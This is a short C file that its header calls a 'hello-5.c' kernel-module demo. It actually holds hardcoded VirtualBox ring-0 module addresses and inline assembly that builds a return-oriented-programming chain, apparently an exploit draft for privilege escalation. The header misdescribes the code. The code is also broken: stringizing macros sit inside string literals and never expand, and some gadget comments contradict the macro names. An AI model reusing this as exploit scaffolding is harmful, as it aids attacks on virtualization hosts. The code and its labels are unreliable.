/*
 *  hello-5.c - Demonstrates command line argument passing to a module.
 */

static void *VMMR0 = 0xffffffffa0903020U;
static void *VboxDDR0 = 0xffffffffa0a02020U;
// static void *VboxDD2R0 = 0xffffffffa0066020U;

/*
0 # rdi
0 # rbp
poppopret = VboxDDR0 + 0xdba # pop rdi; pop rbp; ret
0x69 # rdx
popret = VMMR0 + 0x1f7bd # pop rax; ret
*/


#define STR1(x) #x
#define POP_RDI_POP_RBP_RET(x) STR1(ffffffffa0a02dda;)
#define POP_RAX_RET ffffffffa09227dd;
#define INT_80_RET ffffffffa092287c;
#define POP_RSP_RET ffffffffa09227cd;
#define POP_RBP_RET ffffffffa09032ad;
#define XOR_EAX_EAX_RET ffffffffa09038d8;

void setup_stack(void) {
	asm (
	"push $0x" POP_RBP_RET	// pop rbp; ret
	);
	asm (
	"push $0x STR1(POP_RSP_RET) ;" // push rsp; ret
	"push $0x STR1(XOR_EAX_EAX_RET) ;" // xor eax, eax; ret
	"push $0x STR1(INT_80_RET) ;" // int $0x80; ret
	"push $0x69;"
	"push $0x STR1(POP_RAX_RET) ;" // pop rax; ret
	"push $0x STR1(POP_RBP_RET) ;" // pop rbp; ret
	"push $0x STR1(POP_RSP_RET) ;" // push rsp; ret
	"push $0x0;"
	"push $0x0;"
	"push $0x STR1(POP_RDI_POP_RBP_RET) ;" // pop rdi; pop rbp; ret
	"ret;"
	);
}
